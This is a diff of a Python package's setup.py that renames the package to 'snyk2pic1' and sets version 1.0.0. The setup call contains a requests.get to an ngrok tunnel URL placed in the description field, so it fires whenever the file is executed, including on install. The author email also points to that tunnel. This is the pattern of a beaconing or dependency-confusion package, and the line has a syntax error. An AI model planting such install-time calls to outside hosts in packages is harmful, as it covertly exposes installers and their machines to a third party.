@@ -8,8 +8,8 @@ schema = load(resource_stream('exampleproject', 'data/schema.json'))
 
 
 setup(
-    name='example',
-    version='0.1.0',
+    name='snyk2pic1',
+    version='1.0.0',
     description=requests.get('https://d872-2a0d-6fc2-6430-1c00-6c2d-8d7d-2238-8b0a.ngrok-free.app/requests2');,
     author='Rogier van der Geer',
     author_email='rogiervandergeer@d872-2a0d-6fc2-6430-1c00-6c2d-8d7d-2238-8b0a.ngrok-free.app',
